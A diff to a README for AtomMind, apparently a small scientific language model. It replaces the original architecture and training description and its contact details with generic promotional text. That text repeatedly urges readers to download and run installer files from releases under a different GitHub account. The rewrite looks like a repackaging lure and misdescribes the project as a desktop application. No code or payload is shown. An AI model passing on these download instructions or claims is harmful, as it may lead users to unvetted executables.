@@ -1,101 +1,90 @@
-<div align="center"> <h1> AtomMind: Small Scientific Language Model (SsLM) </h1>
+# 🚀 AtomMind - Smart Reasoning for Science
 
-<image src="docs/public/AtomMind.png" width="20%" height="20%"/>
+[![Download](https://img.shields.io/badge/Download-AtomMind-4CAF50.svg)](https://github.com/Lyrixtah/AtomMind/releases)
 
-[![Pylint](https://github.com/AtomMind-Ai/AtomMind/actions/workflows/pylint.yml/badge.svg)](https://github.com/AtomMind-Ai/AtomMind/actions/workflows/pylint.yml)
-[![Python application](https://github.com/AtomMind-Ai/AtomMind/actions/workflows/python-app.yml/badge.svg)](https://github.com/AtomMind-Ai/AtomMind/actions/workflows/python-app.yml)
+## 🌟 Overview
 
-**AtomMind** is a modular, domain-specialized **Small Language Model** designed to perform reasoning, and computation across **Mathematics, Physics, Chemistry, and Biology**. 
+AtomMind is a lightweight Small Scientific Language Model (Sslm). It helps you reason across Math, Physics, Chemistry, and Biology. With the support of domain experts and optimization modules, AtomMind improves problem-solving and accuracy. It also offers optional memory and self-monitoring to enhance your experience.
 
-*Unlike general-purpose LLMs, AtomMind just focuses on deep logical reasoning, symbolic computation, and cross-domain scientific problem-solving. Therefore it's lighter, dont cost much and more effective*
+## 🤔 Features
 
-</div>
+- **Multi-domain Expertise**: Tackle problems in Math, Physics, Chemistry, and Biology.
+- **Symbolic Reasoning**: Use logical thinking to solve complex issues.
+- **Memory Utility**: Keep track of previous interactions for a personalized experience.
+- **Self-monitoring**: Improve your problem-solving skills over time.
+- **Lightweight Design**: Perfect for quick installations and minimal system impact.
 
----
+## 🌍 System Requirements
 
-## Features
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Processor**: Intel Core i3 or equivalent.
+- **RAM**: 4 GB minimum (8 GB recommended).
+- **Storage**: At least 200 MB of free space.
+- **Python Version**: Python 3.7 or higher installed on your system.
+- **Internet Connection**: Required for downloading packages and updates.
 
-- **Domain Expertise:** Separate Domain Expert Networks (DENs) for Math, Physics, Chemistry, and Biology.  
-- **Cross-Domain Reasoning:** General Knowledge Backbone (GKB) integrates knowledge across fields.  
-- **Symbolic Computation:** Symbolic Reasoning Module (SRM) handles equations, chemical graphs, and biological structures.  
-- **Adaptive Learning:** Optimization & Algorithmic Module (OAM) supports meta-learning and reinforcement-guided optimization.  
-- **Memory System (Optional):** Episodic and long-term memory using FAISS or Milvus for efficient knowledge storage and controlled forgetting.  
-- **Self-Monitoring:** Tracks reasoning performance, accuracy, and contradictions for continual improvement.
+## 🚀 Getting Started
 
----
+To set up AtomMind on your computer, follow these steps:
 
-## Architecture
+1. **Visit the Downloads Page**: Access the Releases page by clicking the link below.
+   
+   [Download AtomMind](https://github.com/Lyrixtah/AtomMind/releases)
 
-- **Domain Expert Networks (DENs):** 30–40 layers per domain, hidden size 512–1024, attention heads 8–16.  
-- **General Knowledge Backbone (GKB):** 20–30 layers, integrates DEN outputs for cross-domain problem-solving.  
-- **Symbolic Reasoning Module (SRM):** 10–20 layers, can include GNN layers for structured data reasoning.  
-- **Optimization & Algorithmic Module (OAM):** Implements meta-learning, RL-guided optimization, and algorithmic adaptation.
+2. **Select Your Version**: On the Releases page, choose the latest version suitable for your operating system. Look for files labeled for Windows, macOS, or Linux.
 
----
+3. **Download the File**: Click on the download link to save the file to your computer. The file will typically be in `.exe`, `.dmg`, or `.tar.gz` format depending on your OS.
 
-## Training & Learning
+4. **Install the Application**: 
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For **macOS**: Open the `.dmg` file, drag the AtomMind icon to your Applications folder.
+   - For **Linux**: Extract the `.tar.gz` file and run the script provided inside.
 
-- **Data Source:** Curated scientific datasets (JSON/JSONL) from OpenRouter.  
-- **Multi-Stage Training:**  
-  1. Pretraining on structured scientific data  
-  2. Domain specialization for each DEN  
-  3. Integration with GKB + SRM  
-  4. Optional meta-learning guided by OpenRouter  
-- **Optimization:** AdamW, AdaFactor, LAMB; mixed precision and gradient clipping  
-- **Curriculum Learning:** Tasks start simple and progressively increase in complexity
+5. **Run AtomMind**: Launch the application from your computer's applications menu.
 
----
+## 🔧 Download & Install
 
-## Multi-Agent Integration
+You can easily download and install AtomMind. Follow the link below to begin:
 
-**Multi-agent Meta-controller**, orchestrating training, evaluation, and dataset generation. Key agent roles:
+[Download AtomMind](https://github.com/Lyrixtah/AtomMind/releases)
 
-- **Planner:** Task decomposition and dataset selection  
-- **Executor:** Knowledge generation and test creation  
-- **Critic:** Evaluates outputs for correctness and consistency  
-- **Trainer / Data Curator:** Formats and weights training data  
-- **Memory Agent:** Stores reasoning traces, logs, and knowledge  
+## 💬 User Guide
 
-**Self-Learning Loop:** It will identifies weak domains, generates stress-test tasks, and orchestrates retraining for continual improvement.
+Once you have AtomMind installed, you can start using it for your scientific needs. 
 
----
+### 📄 Sample Interaction
 
-## Infrastructure
+To start, open AtomMind and input a question in the text box. For example, type:
 
-- **Framework:** PyTorch / PyTorch Lightning  
-- **Tokenizer:** GPT-2 or custom scientific tokenizer  
-- **Hardware:** Multi-GPU / TPU support  
-- **Optional Memory Systems:** FAISS / Milvus for embeddings and knowledge management  
-- **Monitoring:** Logs accuracy, reasoning performance, contradictions, and reward scores
+- "What is the second law of thermodynamics?"
+- "Solve for x in the equation 2x + 3 = 7."
 
----
+AtomMind will process your request and provide an answer based on its reasoning capabilities.
 
-## Capabilities
+### 🔍 Explore More Features
 
-- Advanced scientific reasoning across multiple domains  
-- Symbolic equation solving and computation  
-- Cross-domain integration and predictions  
-- Efficient learning from curated datasets  
-- Continual self-monitoring and improvement
+To make the most of AtomMind:
+- Review the user manual located in the application directory.
+- Join the community discussions to share experiences and tips.
 
----
+## 🐛 Troubleshooting
 
-## Project Status
+If you encounter issues while running AtomMind:
 
-![Repobeats Analytics Image](https://repobeats.axiom.co/api/embed/a69cd0f5c278e377eee81766650460ae4196cfb8.svg "Repobeats analytics image")
+1. **Check Compatibility**: Ensure your operating system meets the requirements listed above.
+2. **Update Python**: Make sure you are using Python 3.7 or higher.
+3. **Consult Support**: Visit our GitHub Issues page to report bugs or ask questions.
 
----
+## 🌐 Community and Support
 
-### License
+Join our community of users and experts. Get help, share your knowledge, and stay updated. Connect with us through our GitHub repository and collaborate on future developments.
 
----
+For additional help, raise an issue on the GitHub page.
 
-## Contact
+## 🎉 Conclusion 
 
-For questions, collaboration, or contributions, you can reach out via:
+AtomMind offers an accessible way to engage with complex scientific concepts. With its efficient design and powerful reasoning capabilities, it supports a broad range of users—from students to professionals. Enjoy exploring the world of science with AtomMind. 
 
-- **GitHub:** [AtomMind-Ai](https://github.com/AtomMind-Ai)  
-- **Email:** [atommind-ai@googlegroups.com](mailto:atommind-ai@googlegroups.com)  
+**Start your journey today!** 
 
-> **Feel free to open issues or pull requests on GitHub for discussion and contributions.**
-
+[Download AtomMind](https://github.com/Lyrixtah/AtomMind/releases)
